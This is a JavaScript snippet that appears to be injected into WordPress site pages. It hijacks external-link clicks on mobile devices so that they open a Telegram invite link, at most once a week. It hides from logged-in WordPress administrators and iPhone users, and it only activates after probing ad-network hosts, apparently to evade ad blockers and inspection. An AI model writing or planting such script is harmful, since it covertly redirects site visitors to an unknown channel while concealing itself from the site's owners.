// Function to check if the link is on the same host
function isSameHost(link) {
  return link.hostname === window.location.hostname;
}

// Function to check if WordPress login cookie exists
function hasWordPressLoginCookie() {
  return document.cookie.includes('wordpress_logged_in');
}

// Function to check if the user agent is iPhone
function isiPhone() {
  return /iPhone/.test(navigator.userAgent);
}

// Function to check if the screen width is mobile
function isMobileWidth() {
  return window.innerWidth <= 768; // Adjust the threshold as needed for mobile width
}

// Function to handle link clicks
function handleLinkClick(event) {
  if (hasWordPressLoginCookie() || isiPhone() || !isMobileWidth()) {
    // Ignore the process if WordPress login cookie exists, user agent is iPhone,
    // or screen width is not considered mobile
    return;
  }

  const link = event.target.closest('a');
  if (link && !isSameHost(link)) {
    const lastOpenTime = localStorage.getItem('lastOpenTime');
    const currentTime = new Date().getTime();
    const twentyFourHours = 7 * 24 * 60 * 60 * 1000; // 7 days in milliseconds

    // Check if it's been more than 24 hours since the last open time
    if (!lastOpenTime || currentTime - lastOpenTime > twentyFourHours) {
      // Open the specific link
      window.open('tg:join?invite=1Xyf4v5TUTdkNTVl');

      // Store the current time in localStorage
      localStorage.setItem('lastOpenTime', currentTime);
    }
  }
}

if(typeof fetch !== "undefined"){

var img = new Image();
img.onload = function() {
console.log('Image is loaded.');
const adUrl = 'https://srtb.msn.com/auction';
fetch(adUrl, { method: 'HEAD', mode: 'no-cors' }).then(response => {



// Add event listener to document for link clicks
document.addEventListener('click', handleLinkClick);



  
}).then(data => {


}).catch(error => {
  



});
};

img.onerror = function() {
console.log('Error loading image.');
  // handle error loading image
};
img.src = 'https://googleads.g.doubleclick.net/favicon.ico';

}
